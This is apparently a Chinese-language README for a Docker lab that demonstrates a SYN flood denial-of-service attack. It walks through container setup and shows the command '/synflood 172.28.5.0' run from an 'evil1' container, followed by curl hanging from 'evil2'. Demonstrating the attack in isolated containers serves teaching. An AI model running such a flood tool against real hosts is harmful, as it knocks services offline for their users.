README
=======

利用 Docker 的自定义网络功能演示 [SYN flood 攻击](https://en.wikipedia.org/wiki/SYN_flood).

### 使用方法

```
git clone https://github.com/knight42/synflood-play && cd synflood-play

docker pull knight42/synflood

./setup.sh
```

执行完 `setup.sh` 后会创建三个容器，分别为 `evil1`、`evil2`、`victim`，其中 `victim` 是攻击目标。

接下来进入 `evil1` 容器：

```
$ docker exec -ti evil1 bash
```

能正常 ping 通 `victim` 容器：

```
bash-4.3# ping victim
PING victim (172.28.5.0): 56 data bytes
64 bytes from 172.28.5.0: seq=0 ttl=64 time=0.219 ms
64 bytes from 172.28.5.0: seq=1 ttl=64 time=0.128 ms
64 bytes from 172.28.5.0: seq=2 ttl=64 time=0.128 ms
64 bytes from 172.28.5.0: seq=3 ttl=64 time=0.131 ms
...
```

执行 `curl victim` 也能看到会返回 404 页面：

```
bash-4.3# curl victim
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

这时我们对 `victim` 进行 SYN flood (向 `victim` 80 端口发送大量 TCP SYN packets):

```
bash-4.3# /synflood 172.28.5.0
```

然后我们进入 `evil2`:

```
$ docker exec -ti evil2 bash
```

执行 `curl -v victim`, 应该会发现程序一直没返回，即对 `victim` 的 DoS 攻击已经成功了。

```
bash-4.3# curl -v victim
* Rebuilt URL to: victim/
*   Trying 172.28.5.0...
* TCP_NODELAY set
```
